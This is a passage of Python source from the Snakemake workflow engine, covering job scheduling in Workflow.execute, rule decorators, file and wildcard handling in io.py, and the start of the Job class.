                prioritytargets=None,
                quiet=False,
                keepgoing=False,
                printshellcmds=False,
                printreason=False,
                printdag=False,
                cluster=None,
                cluster_config=None,
                cluster_sync=None,
                jobname=None,
                immediate_submit=False,
                ignore_ambiguity=False,
                printrulegraph=False,
                printd3dag=False,
                drmaa=None,
                stats=None,
                force_incomplete=False,
                ignore_incomplete=False,
                list_version_changes=False,
                list_code_changes=False,
                list_input_changes=False,
                list_params_changes=False,
                summary=False,
                detailed_summary=False,
                latency_wait=3,
                benchmark_repeats=3,
                wait_for_files=None,
                nolock=False,
                unlock=False,
                resources=None,
                notemp=False,
                nodeps=False,
                cleanup_metadata=None,
                subsnakemake=None,
                updated_files=None,
                keep_target_files=False,
                allowed_rules=None,
                greediness=1.0,
                no_hooks=False):

        self.global_resources = dict() if resources is None else resources
        self.global_resources["_cores"] = cores
        self.global_resources["_nodes"] = nodes

        def rules(items):
            return map(self._rules.__getitem__, filter(self.is_rule, items))

        if keep_target_files:

            def files(items):
                return filterfalse(self.is_rule, items)
        else:

            def files(items):
                return map(os.path.relpath, filterfalse(self.is_rule, items))

        if not targets:
            targets = [self.first_rule
                       ] if self.first_rule is not None else list()
        if prioritytargets is None:
            prioritytargets = list()
        if forcerun is None:
            forcerun = list()

        priorityrules = set(rules(prioritytargets))
        priorityfiles = set(files(prioritytargets))
        forcerules = set(rules(forcerun))
        forcefiles = set(files(forcerun))
        targetrules = set(chain(rules(targets),
                                filterfalse(Rule.has_wildcards, priorityrules),
                                filterfalse(Rule.has_wildcards, forcerules)))
        targetfiles = set(chain(files(targets), priorityfiles, forcefiles))
        if forcetargets:
            forcefiles.update(targetfiles)
            forcerules.update(targetrules)

        rules = self.rules
        if allowed_rules:
            rules = [rule for rule in rules if rule.name in set(allowed_rules)]

        if wait_for_files is not None:
            try:
                snakemake.io.wait_for_files(wait_for_files,
                                            latency_wait=latency_wait)
            except IOError as e:
                logger.error(str(e))
                return False

        dag = DAG(
            self, rules,
            dryrun=dryrun,
            targetfiles=targetfiles,
            targetrules=targetrules,
            forceall=forceall,
            forcefiles=forcefiles,
            forcerules=forcerules,
            priorityfiles=priorityfiles,
            priorityrules=priorityrules,
            ignore_ambiguity=ignore_ambiguity,
            force_incomplete=force_incomplete,
            ignore_incomplete=ignore_incomplete or printdag or printrulegraph,
            notemp=notemp)

        self.persistence = Persistence(
            nolock=nolock,
            dag=dag,
            warn_only=dryrun or printrulegraph or printdag or summary or
            list_version_changes or list_code_changes or list_input_changes or
            list_params_changes)

        if cleanup_metadata:
            for f in cleanup_metadata:
                self.persistence.cleanup_metadata(f)
            return True

        dag.init()
        dag.check_dynamic()

        if unlock:
            try:
                self.persistence.cleanup_locks()
                logger.info("Unlocking working directory.")
                return True
            except IOError:
                logger.error("Error: Unlocking the directory {} failed. Maybe "
                             "you don't have the permissions?")
                return False
        try:
            self.persistence.lock()
        except IOError:
            logger.error(
                "Error: Directory cannot be locked. Please make "
                "sure that no other Snakemake process is trying to create "
                "the same files in the following directory:\n{}\n"
                "If you are sure that no other "
                "instances of snakemake are running on this directory, "
                "the remaining lock was likely caused by a kill signal or "
                "a power loss. It can be removed with "
                "the --unlock argument.".format(os.getcwd()))
            return False

        if self.subworkflows and not printdag and not printrulegraph:
            # backup globals
            globals_backup = dict(self.globals)
            # execute subworkflows
            for subworkflow in self.subworkflows:
                subworkflow_targets = subworkflow.targets(dag)
                updated = list()
                if subworkflow_targets:
                    logger.info(
                        "Executing subworkflow {}.".format(subworkflow.name))
                    if not subsnakemake(subworkflow.snakefile,
                                        workdir=subworkflow.workdir,
                                        targets=subworkflow_targets,
                                        updated_files=updated):
                        return False
                    dag.updated_subworkflow_files.update(subworkflow.target(f)
                                                         for f in updated)
                else:
                    logger.info("Subworkflow {}: Nothing to be done.".format(
                        subworkflow.name))
            if self.subworkflows:
                logger.info("Executing main workflow.")
            # rescue globals
            self.globals.update(globals_backup)

        dag.check_incomplete()
        dag.postprocess()

        if nodeps:
            missing_input = [f for job in dag.targetjobs for f in job.input
                             if dag.needrun(job) and not os.path.exists(f)]
            if missing_input:
                logger.error(
                    "Dependency resolution disabled (--nodeps) "
                    "but missing input "
                    "files detected. If this happens on a cluster, please make sure "
                    "that you handle the dependencies yourself or turn of "
                    "--immediate-submit. Missing input files:\n{}".format(
                        "\n".join(missing_input)))
                return False

        updated_files.extend(f for job in dag.needrun_jobs for f in job.output)

        if printd3dag:
            dag.d3dag()
            return True
        elif printdag:
            print(dag)
            return True
        elif printrulegraph:
            print(dag.rule_dot())
            return True
        elif summary:
            print("\n".join(dag.summary(detailed=False)))
            return True
        elif detailed_summary:
            print("\n".join(dag.summary(detailed=True)))
            return True
        elif list_version_changes:
            items = list(
                chain(*map(self.persistence.version_changed, dag.jobs)))
            if items:
                print(*items, sep="\n")
            return True
        elif list_code_changes:
            items = list(chain(*map(self.persistence.code_changed, dag.jobs)))
            if items:
                print(*items, sep="\n")
            return True
        elif list_input_changes:
            items = list(chain(*map(self.persistence.input_changed, dag.jobs)))
            if items:
                print(*items, sep="\n")
            return True
        elif list_params_changes:
            items = list(
                chain(*map(self.persistence.params_changed, dag.jobs)))
            if items:
                print(*items, sep="\n")
            return True

        scheduler = JobScheduler(self, dag, cores,
                                 local_cores=local_cores,
                                 dryrun=dryrun,
                                 touch=touch,
                                 cluster=cluster,
                                 cluster_config=cluster_config,
                                 cluster_sync=cluster_sync,
                                 jobname=jobname,
                                 immediate_submit=immediate_submit,
                                 quiet=quiet,
                                 keepgoing=keepgoing,
                                 drmaa=drmaa,
                                 printreason=printreason,
                                 printshellcmds=printshellcmds,
                                 latency_wait=latency_wait,
                                 benchmark_repeats=benchmark_repeats,
                                 greediness=greediness)

        if not dryrun and not quiet:
            if len(dag):
                if cluster or cluster_sync or drmaa:
                    logger.resources_info(
                        "Provided cluster nodes: {}".format(nodes))
                else:
                    logger.resources_info("Provided cores: {}".format(cores))
                    logger.resources_info("Rules claiming more threads will be scaled down.")
                provided_resources = format_resources(resources)
                if provided_resources:
                    logger.resources_info(
                        "Provided resources: " + provided_resources)
                ignored_resources = format_resource_names(
                    set(resource for job in dag.needrun_jobs for resource in
                        job.resources_dict if resource not in resources))
                if ignored_resources:
                    logger.resources_info(
                        "Ignored resources: " + ignored_resources)
                logger.run_info("\n".join(dag.stats()))
            else:
                logger.info("Nothing to be done.")
        if dryrun and not len(dag):
            logger.info("Nothing to be done.")

        success = scheduler.schedule()

        if success:
            if dryrun:
                if not quiet and len(dag):
                    logger.run_info("\n".join(dag.stats()))
            elif stats:
                scheduler.stats.to_json(stats)
            if not dryrun and not no_hooks:
                self._onsuccess(logger.get_logfile())
            return True
        else:
            if not dryrun and not no_hooks:
                self._onerror(logger.get_logfile())
            return False

    def include(self, snakefile,
                overwrite_first_rule=False,
                print_compilation=False,
                overwrite_shellcmd=None):
        """
        Include a snakefile.
        """
        # check if snakefile is a path to the filesystem
        if not urllib.parse.urlparse(snakefile).scheme:
            if not os.path.isabs(snakefile) and self.included_stack:
                current_path = os.path.dirname(self.included_stack[-1])
                snakefile = os.path.join(current_path, snakefile)
            snakefile = os.path.abspath(snakefile)
        # else it could be an url.
        # at least we don't want to modify the path for clarity.

        if snakefile in self.included:
            logger.info("Multiple include of {} ignored".format(snakefile))
            return
        self.included.append(snakefile)
        self.included_stack.append(snakefile)

        global workflow

        workflow = self

        first_rule = self.first_rule
        code, linemap = parse(snakefile,
                              overwrite_shellcmd=self.overwrite_shellcmd)

        if print_compilation:
            print(code)

        # insert the current directory into sys.path
        # this allows to import modules from the workflow directory
        sys.path.insert(0, os.path.dirname(snakefile))

        self.linemaps[snakefile] = linemap
        exec(compile(code, snakefile, "exec"), self.globals)
        if not overwrite_first_rule:
            self.first_rule = first_rule
        self.included_stack.pop()

    def onsuccess(self, func):
        self._onsuccess = func

    def onerror(self, func):
        self._onerror = func

    def workdir(self, workdir):
        if self.overwrite_workdir is None:
            if not os.path.exists(workdir):
                os.makedirs(workdir)
            self._workdir = workdir
            os.chdir(workdir)

    def configfile(self, jsonpath):
        """ Update the global config with the given dictionary. """
        global config
        c = snakemake.io.load_configfile(jsonpath)
        update_config(config, c)
        update_config(config, self.overwrite_config)

    def ruleorder(self, *rulenames):
        self._ruleorder.add(*rulenames)

    def subworkflow(self, name, snakefile=None, workdir=None):
        sw = Subworkflow(self, name, snakefile, workdir)
        self._subworkflows[name] = sw
        self.globals[name] = sw.target

    def localrules(self, *rulenames):
        self._localrules.update(rulenames)

    def rule(self, name=None, lineno=None, snakefile=None):
        name = self.add_rule(name, lineno, snakefile)
        rule = self.get_rule(name)

        def decorate(ruleinfo):
            if ruleinfo.input:
                rule.set_input(*ruleinfo.input[0], **ruleinfo.input[1])
            if ruleinfo.output:
                rule.set_output(*ruleinfo.output[0], **ruleinfo.output[1])
            if ruleinfo.params:
                rule.set_params(*ruleinfo.params[0], **ruleinfo.params[1])
            if ruleinfo.threads:
                if not isinstance(ruleinfo.threads, int):
                    raise RuleException("Threads value has to be an integer.",
                                        rule=rule)
                rule.resources["_cores"] = ruleinfo.threads
            if ruleinfo.resources:
                args, resources = ruleinfo.resources
                if args:
                    raise RuleException("Resources have to be named.")
                if not all(map(lambda r: isinstance(r, int),
                               resources.values())):
                    raise RuleException(
                        "Resources values have to be integers.",
                        rule=rule)
                rule.resources.update(resources)
            if ruleinfo.priority:
                if (not isinstance(ruleinfo.priority, int) and
                    not isinstance(ruleinfo.priority, float)):
                    raise RuleException("Priority values have to be numeric.",
                                        rule=rule)
                rule.priority = ruleinfo.priority
            if ruleinfo.version:
                rule.version = ruleinfo.version
            if ruleinfo.log:
                rule.set_log(*ruleinfo.log[0], **ruleinfo.log[1])
            if ruleinfo.message:
                rule.message = ruleinfo.message
            if ruleinfo.benchmark:
                rule.benchmark = ruleinfo.benchmark
            rule.norun = ruleinfo.norun
            rule.docstring = ruleinfo.docstring
            rule.run_func = ruleinfo.func
            rule.shellcmd = ruleinfo.shellcmd
            ruleinfo.func.__name__ = "__{}".format(name)
            self.globals[ruleinfo.func.__name__] = ruleinfo.func
            setattr(rules, name, rule)
            return ruleinfo.func

        return decorate

    def docstring(self, string):
        def decorate(ruleinfo):
            ruleinfo.docstring = string
            return ruleinfo

        return decorate

    def input(self, *paths, **kwpaths):
        def decorate(ruleinfo):
            ruleinfo.input = (paths, kwpaths)
            return ruleinfo

        return decorate

    def output(self, *paths, **kwpaths):
        def decorate(ruleinfo):
            ruleinfo.output = (paths, kwpaths)
            return ruleinfo

        return decorate

    def params(self, *params, **kwparams):
        def decorate(ruleinfo):
            ruleinfo.params = (params, kwparams)
            return ruleinfo

        return decorate

    def message(self, message):
        def decorate(ruleinfo):
            ruleinfo.message = message
            return ruleinfo

        return decorate

    def benchmark(self, benchmark):
        def decorate(ruleinfo):
            ruleinfo.benchmark = benchmark
            return ruleinfo

        return decorate

    def threads(self, threads):
        def decorate(ruleinfo):
            ruleinfo.threads = threads
            return ruleinfo

        return decorate

    def resources(self, *args, **resources):
        def decorate(ruleinfo):
            ruleinfo.resources = (args, resources)
            return ruleinfo

        return decorate

    def priority(self, priority):
        def decorate(ruleinfo):
            ruleinfo.priority = priority
            return ruleinfo

        return decorate

    def version(self, version):
        def decorate(ruleinfo):
            ruleinfo.version = version
            return ruleinfo

        return decorate

    def log(self, *logs, **kwlogs):
        def decorate(ruleinfo):
            ruleinfo.log = (logs, kwlogs)
            return ruleinfo

        return decorate

    def shellcmd(self, cmd):
        def decorate(ruleinfo):
            ruleinfo.shellcmd = cmd
            return ruleinfo

        return decorate

    def norun(self):
        def decorate(ruleinfo):
            ruleinfo.norun = True
            return ruleinfo

        return decorate

    def run(self, func):
        return RuleInfo(func)

    @staticmethod
    def _empty_decorator(f):
        return f


class RuleInfo:
    def __init__(self, func):
        self.func = func
        self.shellcmd = None
        self.norun = False
        self.input = None
        self.output = None
        self.params = None
        self.message = None
        self.benchmark = None
        self.threads = None
        self.resources = None
        self.priority = None
        self.version = None
        self.log = None
        self.docstring = None


class Subworkflow:
    def __init__(self, workflow, name, snakefile, workdir):
        self.workflow = workflow
        self.name = name
        self._snakefile = snakefile
        self._workdir = workdir

    @property
    def snakefile(self):
        if self._snakefile is None:
            return os.path.abspath(os.path.join(self.workdir, "Snakefile"))
        if not os.path.isabs(self._snakefile):
            return os.path.abspath(os.path.join(self.workflow.basedir,
                                                self._snakefile))
        return self._snakefile

    @property
    def workdir(self):
        workdir = "." if self._workdir is None else self._workdir
        if not os.path.isabs(workdir):
            return os.path.abspath(os.path.join(self.workflow.basedir,
                                                workdir))
        return workdir

    def target(self, paths):
        if not_iterable(paths):
            return flag(os.path.join(self.workdir, paths), "subworkflow", self)
        return [self.target(path) for path in paths]

    def targets(self, dag):
        return [f for job in dag.jobs for f in job.subworkflow_input
                if job.subworkflow_input[f] is self]


class Rules:
    """ A namespace for rules so that they can be accessed via dot notation. """
    pass


def srcdir(path):
    """Return the absolute path, relative to the source directory of the current Snakefile."""
    if not workflow.included_stack:
        return None
    return os.path.join(os.path.dirname(workflow.included_stack[-1]), path)

__author__ = "Johannes Kster"
__copyright__ = "Copyright 2015, Johannes Kster"
__email__ = "koester@jimmy.harvard.edu"
__license__ = "MIT"

import os
import re
import stat
import time
import json
from itertools import product, chain
from collections import Iterable, namedtuple
from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError                    
from snakemake.logging import logger


def lstat(f):
    return os.stat(f, follow_symlinks=os.stat not in os.supports_follow_symlinks)


def lutime(f, times):
    return os.utime(f, times, follow_symlinks=os.utime not in os.supports_follow_symlinks)


def lchmod(f, mode):
    return os.chmod(f, mode, follow_symlinks=os.chmod not in os.supports_follow_symlinks)


def IOFile(file, rule=None):
    f = _IOFile(file)
    f.rule = rule
    return f


class _IOFile(str):
    """
    A file that is either input or output of a rule.
    """

    dynamic_fill = "__snakemake_dynamic__"

    def __new__(cls, file):
        obj = str.__new__(cls, file)
        obj._is_function = type(file).__name__ == "function"
        obj._file = file
        obj.rule = None
        obj._regex = None
        return obj

    @property
    def file(self):
        if not self._is_function:
            return self._file
        else:
            raise ValueError("This IOFile is specified as a function and "
                             "may not be used directly.")

    @property
    def exists(self):
        return os.path.exists(self.file)

    @property
    def protected(self):                    
        return self.exists and not os.access(self.file, os.W_OK)                    

    @property
    def mtime(self):
        # do not follow symlinks for modification time
        return lstat(self.file).st_mtime

    @property
    def size(self):
        # follow symlinks but throw error if invalid
        self.check_broken_symlink()
        return os.path.getsize(self.file)

    def check_broken_symlink(self):
        """ Raise WorkflowError if file is a broken symlink. """
        if not self.exists and lstat(self.file):                    
            raise WorkflowError("File {} seems to be a broken symlink.".format(self.file))

    def is_newer(self, time):
        return self.mtime > time

    def prepare(self):
        path_until_wildcard = re.split(self.dynamic_fill, self.file)[0]
        dir = os.path.dirname(path_until_wildcard)
        if len(dir) > 0 and not os.path.exists(dir):
            try:
                os.makedirs(dir)
            except OSError as e:
                # ignore Errno 17 "File exists" (reason: multiprocessing)
                if e.errno != 17:
                    raise e

    def protect(self):
        mode = (lstat(self.file).st_mode & ~stat.S_IWUSR & ~stat.S_IWGRP & ~
                stat.S_IWOTH)
        if os.path.isdir(self.file):
            for root, dirs, files in os.walk(self.file):
                for d in dirs:
                    lchmod(os.path.join(self.file, d), mode)
                for f in files:
                    lchmod(os.path.join(self.file, f), mode)
        else:
            lchmod(self.file, mode)

    def remove(self):
        remove(self.file)

    def touch(self):                    
        try:
            lutime(self.file, None)                    
        except OSError as e:
            if e.errno == 2:
                raise MissingOutputException(
                    "Output file {} of rule {} shall be touched but "
                    "does not exist.".format(self.file, self.rule.name),
                    lineno=self.rule.lineno,
                    snakefile=self.rule.snakefile)
            else:
                raise e

    def touch_or_create(self):
        try:
            self.touch()
        except MissingOutputException:
            # create empty file
            with open(self.file, "w") as f:
                pass

    def apply_wildcards(self, wildcards,
                        fill_missing=False,
                        fail_dynamic=False):
        f = self._file
        if self._is_function:
            f = self._file(Namedlist(fromdict=wildcards))

        return IOFile(apply_wildcards(f, wildcards,                    
                                      fill_missing=fill_missing,
                                      fail_dynamic=fail_dynamic,
                                      dynamic_fill=self.dynamic_fill),
                      rule=self.rule)                    

    def get_wildcard_names(self):
        return get_wildcard_names(self.file)

    def contains_wildcard(self):
        return contains_wildcard(self.file)

    def regex(self):
        if self._regex is None:
            # compile a regular expression
            self._regex = re.compile(regex(self.file))
        return self._regex

    def constant_prefix(self):
        first_wildcard = _wildcard_regex.search(self.file)
        if first_wildcard:
            return self.file[:first_wildcard.start()]
        return self.file

    def match(self, target):
        return self.regex().match(target) or None

    def format_dynamic(self):
        return self.replace(self.dynamic_fill, "{*}")

    def __eq__(self, other):
        f = other._file if isinstance(other, _IOFile) else other
        return self._file == f

    def __hash__(self):
        return self._file.__hash__()


_wildcard_regex = re.compile(
    "\{\s*(?P<name>\w+?)(\s*,\s*(?P<constraint>([^\{\}]+|\{\d+(,\d+)?\})*))?\s*\}")

#    "\{\s*(?P<name>\w+?)(\s*,\s*(?P<constraint>[^\}]*))?\s*\}")


def wait_for_files(files, latency_wait=3):
    """Wait for given files to be present in filesystem."""
    files = list(files)
    get_missing = lambda: [f for f in files if not os.path.exists(f)]
    missing = get_missing()
    if missing:
        logger.info("Waiting at most {} seconds for missing files.".format(
            latency_wait))
        for _ in range(latency_wait):
            if not get_missing():
                return
            time.sleep(1)
        raise IOError("Missing files after {} seconds:\n{}".format(
            latency_wait, "\n".join(get_missing())))


def get_wildcard_names(pattern):
    return set(match.group('name')
               for match in _wildcard_regex.finditer(pattern))


def contains_wildcard(path):
    return _wildcard_regex.search(path) is not None


def remove(file):
    if os.path.exists(file):
        if os.path.isdir(file):
            try:
                os.removedirs(file)
            except OSError:
                # ignore non empty directories
                pass
        else:
            os.remove(file)


def regex(filepattern):
    f = []
    last = 0
    wildcards = set()
    for match in _wildcard_regex.finditer(filepattern):
        f.append(re.escape(filepattern[last:match.start()]))
        wildcard = match.group("name")
        if wildcard in wildcards:
            if match.group("constraint"):
                raise ValueError(
                    "If multiple wildcards of the same name "
                    "appear in a string, eventual constraints have to be defined "
                    "at the first occurence and will be inherited by the others.")
            f.append("(?P={})".format(wildcard))
        else:
            wildcards.add(wildcard)
            f.append("(?P<{}>{})".format(wildcard, match.group("constraint") if
                                         match.group("constraint") else ".+"))
        last = match.end()
    f.append(re.escape(filepattern[last:]))
    f.append("$")  # ensure that the match spans the whole file
    return "".join(f)


def apply_wildcards(pattern, wildcards,
                    fill_missing=False,
                    fail_dynamic=False,
                    dynamic_fill=None,
                    keep_dynamic=False):
    def format_match(match):
        name = match.group("name")
        try:
            value = wildcards[name]
            if fail_dynamic and value == dynamic_fill:
                raise WildcardError(name)
            return str(value)  # convert anything into a str
        except KeyError as ex:
            if keep_dynamic:
                return "{{{}}}".format(name)
            elif fill_missing:
                return dynamic_fill
            else:
                raise WildcardError(str(ex))

    return re.sub(_wildcard_regex, format_match, pattern)


def not_iterable(value):
    return isinstance(value, str) or not isinstance(value, Iterable)


class AnnotatedString(str):
    def __init__(self, value):
        self.flags = dict()


def flag(value, flag_type, flag_value=True):
    if isinstance(value, AnnotatedString):
        value.flags[flag_type] = flag_value
        return value
    if not_iterable(value):
        value = AnnotatedString(value)
        value.flags[flag_type] = flag_value
        return value
    return [flag(v, flag_type, flag_value=flag_value) for v in value]


def is_flagged(value, flag):
    if isinstance(value, AnnotatedString):
        return flag in value.flags                    
    return False


def temp(value):
    """
    A flag for an input or output file that shall be removed after usage.
    """
    if is_flagged(value, "protected"):
        raise SyntaxError(
            "Protected and temporary flags are mutually exclusive.")
    return flag(value, "temp")


def temporary(value):
    """ An alias for temp. """
    return temp(value)


def protected(value):
    """ A flag for a file that shall be write protected after creation. """
    if is_flagged(value, "temp"):
        raise SyntaxError(
            "Protected and temporary flags are mutually exclusive.")
    return flag(value, "protected")


def dynamic(value):
    """
    A flag for a file that shall be dynamic, i.e. the multiplicity
    (and wildcard values) will be expanded after a certain
    rule has been run """
    annotated = flag(value, "dynamic")                    
    tocheck = [annotated] if not_iterable(annotated) else annotated
    for file in tocheck:
        matches = list(_wildcard_regex.finditer(file))
        #if len(matches) != 1:
        #    raise SyntaxError("Dynamic files need exactly one wildcard.")
        for match in matches:
            if match.group("constraint"):
                raise SyntaxError(
                    "The wildcards in dynamic files cannot be constrained.")
    return annotated


def touch(value):
    return flag(value, "touch")


def expand(*args, **wildcards):
    """
    Expand wildcards in given filepatterns.

    Arguments
    *args -- first arg: filepatterns as list or one single filepattern,
        second arg (optional): a function to combine wildcard values
        (itertools.product per default)
    **wildcards -- the wildcards as keyword arguments
        with their values as lists
    """
    filepatterns = args[0]
    if len(args) == 1:
        combinator = product
    elif len(args) == 2:
        combinator = args[1]
    if isinstance(filepatterns, str):
        filepatterns = [filepatterns]

    def flatten(wildcards):
        for wildcard, values in wildcards.items():
            if isinstance(values, str) or not isinstance(values, Iterable):
                values = [values]
            yield [(wildcard, value) for value in values]

    try:
        return [filepattern.format(**comb)
                for comb in map(dict, combinator(*flatten(wildcards))) for
                filepattern in filepatterns]
    except KeyError as e:
        raise WildcardError("No values given for wildcard {}.".format(e))


def limit(pattern, **wildcards):
    """
    Limit wildcards to the given values.

    Arguments:
    **wildcards -- the wildcards as keyword arguments
                   with their values as lists
    """
    return pattern.format(**{
        wildcard: "{{{},{}}}".format(wildcard, "|".join(values))
        for wildcard, values in wildcards.items()
    })


def glob_wildcards(pattern):
    """
    Glob the values of the wildcards by matching the given pattern to the filesystem.
    Returns a named tuple with a list of values for each wildcard.
    """
    pattern = os.path.normpath(pattern)
    first_wildcard = re.search("{[^{]", pattern)
    dirname = os.path.dirname(pattern[:first_wildcard.start(
    )]) if first_wildcard else os.path.dirname(pattern)
    if not dirname:
        dirname = "."

    names = [match.group('name')
             for match in _wildcard_regex.finditer(pattern)]
    Wildcards = namedtuple("Wildcards", names)
    wildcards = Wildcards(*[list() for name in names])

    pattern = re.compile(regex(pattern))
    for dirpath, dirnames, filenames in os.walk(dirname):
        for f in chain(filenames, dirnames):
            if dirpath != ".":
                f = os.path.join(dirpath, f)
            match = re.match(pattern, f)
            if match:
                for name, value in match.groupdict().items():
                    getattr(wildcards, name).append(value)
    return wildcards


# TODO rewrite Namedlist!
class Namedlist(list):
    """
    A list that additionally provides functions to name items. Further,
    it is hashable, however the hash does not consider the item names.
    """

    def __init__(self, toclone=None, fromdict=None, plainstr=False):
        """
        Create the object.

        Arguments
        toclone  -- another Namedlist that shall be cloned
        fromdict -- a dict that shall be converted to a
            Namedlist (keys become names)
        """
        list.__init__(self)
        self._names = dict()

        if toclone:
            self.extend(map(str, toclone) if plainstr else toclone)
            if isinstance(toclone, Namedlist):
                self.take_names(toclone.get_names())
        if fromdict:
            for key, item in fromdict.items():
                self.append(item)
                self.add_name(key)

    def add_name(self, name):
        """
        Add a name to the last item.

        Arguments
        name -- a name
        """
        self.set_name(name, len(self) - 1)

    def set_name(self, name, index, end=None):
        """
        Set the name of an item.

        Arguments
        name  -- a name
        index -- the item index
        """
        self._names[name] = (index, end)
        if end is None:
            setattr(self, name, self[index])
        else:
            setattr(self, name, Namedlist(toclone=self[index:end]))

    def get_names(self):
        """
        Get the defined names as (name, index) pairs.
        """
        for name, index in self._names.items():
            yield name, index

    def take_names(self, names):
        """
        Take over the given names.

        Arguments
        names -- the given names as (name, index) pairs
        """
        for name, (i, j) in names:
            self.set_name(name, i, end=j)

    def items(self):
        for name in self._names:
            yield name, getattr(self, name)

    def allitems(self):
        next = 0
        for name, index in sorted(self._names.items(),
                                  key=lambda item: item[1][0]):
            start, end = index
            if end is None:
                end = start + 1
            if start > next:
                for item in self[next:start]:
                    yield None, item
            yield name, getattr(self, name)
            next = end
        for item in self[next:]:
            yield None, item

    def insert_items(self, index, items):
        self[index:index + 1] = items
        add = len(items) - 1
        for name, (i, j) in self._names.items():
            if i > index:
                self._names[name] = (i + add, j + add)
            elif i == index:
                self.set_name(name, i, end=i + len(items))

    def keys(self):
        return self._names

    def plainstrings(self):
        return self.__class__.__call__(toclone=self, plainstr=True)

    def __getitem__(self, key):
        try:
            return super().__getitem__(key)
        except TypeError:
            pass
        return getattr(self, key)

    def __hash__(self):
        return hash(tuple(self))

    def __str__(self):
        return " ".join(map(str, self))


class InputFiles(Namedlist):
    pass


class OutputFiles(Namedlist):
    pass


class Wildcards(Namedlist):
    pass


class Params(Namedlist):
    pass


class Resources(Namedlist):
    pass


class Log(Namedlist):
    pass


def _load_configfile(configpath):
    "Tries to load a configfile first as JSON, then as YAML, into a dict."
    try:
        with open(configpath) as f:
            try:
                return json.load(f)
            except ValueError:
                f.seek(0)  # try again
            try:
                import yaml
            except ImportError:
                raise WorkflowError("Config file is not valid JSON and PyYAML "
                                    "has not been installed. Please install "
                                    "PyYAML to use YAML config files.")
            try:
                return yaml.load(f)
            except yaml.YAMLError:
                raise WorkflowError("Config file is not valid JSON or YAML.")
    except FileNotFoundError:
        raise WorkflowError("Config file {} not found.".format(configpath))


def load_configfile(configpath):
    "Loads a JSON or YAML configfile as a dict, then checks that it's a dict."
    config = _load_configfile(configpath)
    if not isinstance(config, dict):
        raise WorkflowError("Config file must be given as JSON or YAML "
                            "with keys at top level.")
    return config

##### Wildcard pumping detection #####


class PeriodicityDetector:
    def __init__(self, min_repeat=50, max_repeat=100):
        """
        Args:
            max_len (int): The maximum length of the periodic substring.
        """
        self.regex = re.compile(
            "((?P<value>.+)(?P=value){{{min_repeat},{max_repeat}}})$".format(
                min_repeat=min_repeat - 1,
                max_repeat=max_repeat - 1))

    def is_periodic(self, value):
        """Returns the periodic substring or None if not periodic."""
        m = self.regex.search(value)  # search for a periodic suffix.
        if m is not None:
            return m.group("value")

__author__ = "Johannes Kster"
__copyright__ = "Copyright 2015, Johannes Kster"
__email__ = "koester@jimmy.harvard.edu"
__license__ = "MIT"

import os
import sys
import base64
import json

from collections import defaultdict
from itertools import chain
from functools import partial
from operator import attrgetter

from snakemake.io import IOFile, Wildcards, Resources, _IOFile                    
from snakemake.utils import format, listfiles
from snakemake.exceptions import RuleException, ProtectedOutputException
from snakemake.exceptions import UnexpectedOutputException
from snakemake.logging import logger


def jobfiles(jobs, type):
    return chain(*map(attrgetter(type), jobs))


class Job:
    HIGHEST_PRIORITY = sys.maxsize

    def __init__(self, rule, dag, targetfile=None, format_wildcards=None):
        self.rule = rule
        self.dag = dag
        self.targetfile = targetfile

        self.wildcards_dict = self.rule.get_wildcards(targetfile)
        self.wildcards = Wildcards(fromdict=self.wildcards_dict)
        self._format_wildcards = (self.wildcards if format_wildcards is None
                                  else Wildcards(fromdict=format_wildcards))

        (self.input, self.output, self.params, self.log, self.benchmark,
         self.ruleio,
         self.dependencies) = rule.expand_wildcards(self.wildcards_dict)

        self.resources_dict = {
            name: min(self.rule.workflow.global_resources.get(name, res), res)
            for name, res in rule.resources.items()
        }
        self.threads = self.resources_dict["_cores"]
        self.resources = Resources(fromdict=self.resources_dict)
        self._inputsize = None

        self.dynamic_output, self.dynamic_input = set(), set()
        self.temp_output, self.protected_output = set(), set()
        self.touch_output = set()
        self.subworkflow_input = dict()
        for f in self.output:
            f_ = self.ruleio[f]
            if f_ in self.rule.dynamic_output:
                self.dynamic_output.add(f)
            if f_ in self.rule.temp_output:
                self.temp_output.add(f)
            if f_ in self.rule.protected_output:
                self.protected_output.add(f)
            if f_ in self.rule.touch_output:
                self.touch_output.add(f)
        for f in self.input:
            f_ = self.ruleio[f]
            if f_ in self.rule.dynamic_input:
                self.dynamic_input.add(f)
            if f_ in self.rule.subworkflow_input:
                self.subworkflow_input[f] = self.rule.subworkflow_input[f_]
        self._hash = self.rule.__hash__()
        if True or not self.dynamic_output:
            for o in self.output:
                self._hash ^= o.__hash__()

    @property
    def priority(self):
        return self.dag.priority(self)

    @property
    def b64id(self):
        return base64.b64encode((self.rule.name + "".join(self.output)
                                 ).encode("utf-8")).decode("utf-8")

    @property
    def inputsize(self):
        """
        Return the size of the input files.
        Input files need to be present.
        """
        if self._inputsize is None:
            self._inputsize = sum(f.size for f in self.input)
        return self._inputsize

    @property
    def message(self):
        """ Return the message for this job. """
        try:
            return (self.format_wildcards(self.rule.message) if
                    self.rule.message else None)
        except AttributeError as ex:
            raise RuleException(str(ex), rule=self.rule)
        except KeyError as ex:
            raise RuleException("Unknown variable in message "
                                "of shell command: {}".format(str(ex)),
                                rule=self.rule)

    @property
    def shellcmd(self):
        """ Return the shell command. """
        try:
            return (self.format_wildcards(self.rule.shellcmd) if
                    self.rule.shellcmd else None)
        except AttributeError as ex:
            raise RuleException(str(ex), rule=self.rule)
        except KeyError as ex:
            raise RuleException("Unknown variable when printing "
                                "shell command: {}".format(str(ex)),
                                rule=self.rule)

    @property
    def expanded_output(self):
        """ Iterate over output files while dynamic output is expanded. """
        for f, f_ in zip(self.output, self.rule.output):
            if f in self.dynamic_output:
                expansion = self.expand_dynamic(
                    f_,
                    restriction=self.wildcards,
                    omit_value=_IOFile.dynamic_fill)
                if not expansion:
                    yield f_
                for f, _ in expansion:
                    yield IOFile(f, self.rule)                    
            else:
                yield f

    @property
    def dynamic_wildcards(self):
        """ Return all wildcard values determined from dynamic output. """
        combinations = set()
        for f, f_ in zip(self.output, self.rule.output):
            if f in self.dynamic_output:
                for f, w in self.expand_dynamic(
                    f_,
                    restriction=self.wildcards,
                    omit_value=_IOFile.dynamic_fill):
                    combinations.add(tuple(w.items()))
        wildcards = defaultdict(list)
        for combination in combinations:
            for name, value in combination:
                wildcards[name].append(value)
        return wildcards

    @property
    def missing_input(self):
        """ Return missing input files. """
        # omit file if it comes from a subworkflow
        return set(f for f in self.input
                   if not f.exists and not f in self.subworkflow_input)

    @property
    def output_mintime(self):
        """ Return oldest output file. """
